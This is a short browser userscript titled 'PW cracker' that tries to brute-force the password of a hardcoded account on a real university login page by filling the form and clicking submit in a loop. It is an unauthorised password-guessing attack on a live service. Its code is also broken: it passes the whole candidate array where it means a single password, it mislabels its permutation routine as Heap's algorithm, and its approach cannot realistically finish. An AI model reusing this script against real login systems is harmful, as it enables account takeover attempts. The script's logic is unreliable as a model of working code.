// ==UserScript==
// @name         PW cracker
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Crack a pw on myMarist login to show the IT department their security sucks!
// @author       Daniel
// @match        https://login.marist.edu/cas/login
// @grant        none
// ==/UserScript==

if (window.location == 'https://login.marist.edu/cas/login') {
    if(!document.getElementById('password').value){
        alert("Starting");
        var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
        permutations = permut(charset);
        for (var permutation of permutations){
            testPW(permutations);
        }  
    }
}

function testPW(string){
    //Place password attempt in password textbox
    username = "stdg1";
    document.getElementById('username').value = username;
    document.getElementById('password').value = permutations;
    //Press the submit button
    document.getElementsByName('submit')[0].click();
}

//Heaps Algorithm
function permut(string) {
    if (string.length < 2) return string; //break condition
    var permutations = []; //array to hold permutations

    for (var i=0; i<string.length; i++) {
        var char = string[i];
        // Eliminate duplicates:
        if (string.indexOf(char) != i) // if char was used already
            continue;           // skip it this time
        var remainingString = string.slice(0,i) + string.slice(i+1,string.length);
        for (var subPermutation of permut(remainingString))
            permutations.push(char + subPermutation);
    }
    return permutations;
}